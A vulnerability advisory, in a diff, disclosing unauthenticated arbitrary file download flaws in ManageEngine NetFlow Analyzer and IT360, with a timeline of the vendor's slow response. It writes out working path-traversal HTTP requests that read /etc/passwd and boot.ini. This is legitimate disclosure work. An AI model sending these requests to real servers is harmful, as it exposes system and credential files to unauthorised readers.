@@ -1,0 +1,67 @@
+>> Arbitrary file download in ManageEngine Netflow Analyzer and IT360
+>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security
+==========================================================================
+Disclosure: 30/11/2014 / Last updated: 3/12/2014
+
+>> Background on the affected product:
+"NetFlow Analyzer, a complete traffic analytics tool, leverages flow technologies to provide real time visibility into the network bandwidth performance. NetFlow Analyzer, primarily a bandwidth monitoring tool, has been optimizing thousands of networks across the World by giving holistic view about their network bandwidth and traffic patterns. NetFlow Analyzer is a unified solution that collects, analyzes and reports about what your network bandwidth is being used for and by whom."
+
+"Managing mission critical business applications is now made easy through ManageEngine IT360. With agentless monitoring methodology, monitor your applications, servers and databases with ease. Agentless monitoring of your business applications enables you high ROI and low TOC. With integrated network monitoring and bandwidth utilization, quickly troubleshoot any performance related issue with your network and assign issues automatically with ITIL based ServiceDesk integration."
+
+This is being released as a 0-day because ManageEngine have been twiddling their thumbs (and making a fool out of me) for 105 days. See timeline below for explanation.
+
+
+>> Technical details:
+Vulnerability: Arbitrary file download
+Constraints: unauthenticated in NetFlow; authenticated in IT360
+Affected versions: NetFlow v8.6 to v10.2; at least IT360 v10.3 and above
+
+CVE-2014-5445:
+GET /netflow/servlet/CSVServlet?schFilePath=/etc/passwd
+GET /netflow/servlet/CReportPDFServlet?schFilePath=C:\\boot.ini&pdf=true
+
+CVE-2014-5446
+GET /netflow/servlet/DisplayChartPDF?filename=../../../../boot.ini
+
+All 3 servlets can be exploited in both Windows and Linux. A Metasploit module that exploits CVE-2014-5445 has been released.
+
+
+>> Fix: 
+UNFIXED - ManageEngine failed to take action after 105 days.
+
+Timeline of disclosure:
+18/08/2014
+- Requested contact via ManageEngine Security Response Center.
+
+19/08/2014
+- Received contact from the NetFlow Analyzer support team. Responded with the security advisory above detailing the vulnerabilities.
+- Further back and forth explaining the vulnerabilities, how to exploit them and their impact.
+
+22/08/2014
+- Requested information regarding the release date for the fix. Received response "We do not have a ETA on this, I will check with our engineering team and update  you."
+
+22/09/2014
+- Requested information regarding the release date for the fix. Received response "We expect that the new release will be within the next couple of weeks".
+
+20/10/2014
+- Requested information regarding the release date for the fix. Received response "Our new release will be happening early by next week, you can get the update in our NetFlow Analyzer website".
+- Asked if they are sure that the fix will be included in the new release. Received response "yes you are correct, the issue that you have specified is fixed in new release".
+
+27/10/2014
+- NetFlow Analyzer version 10.2 released - still vulnerable. 
+- Sent an email to ManageEngine asking if they are going to release a fix soon. Received response "We will release the PPM file of the upgrade soon, in which we have fixed the Vulnerability you mentioned".
+
+5/11/2014
+- Requested information regarding the release date for the fix. Received response "You can expect the release before this month end".
+
+28/11/2014
+- Requested information regarding the release date for the fix. Received response "The PPM file is in testing phase and will be released in next Month".
+- Asked if they can commit to a date. Received response "the ppm is in testing phase now, as it is one of the major release, we will not be able to give an exact date of release".
+
+30/11/2014
+- Realised that ManageEngine have been playing me for 105 days, and immediately released advisory and exploit.
+
+================
+Agile Information Security Limited
+http://www.agileinfosec.co.uk/
+>> Enabling secure digital business >>
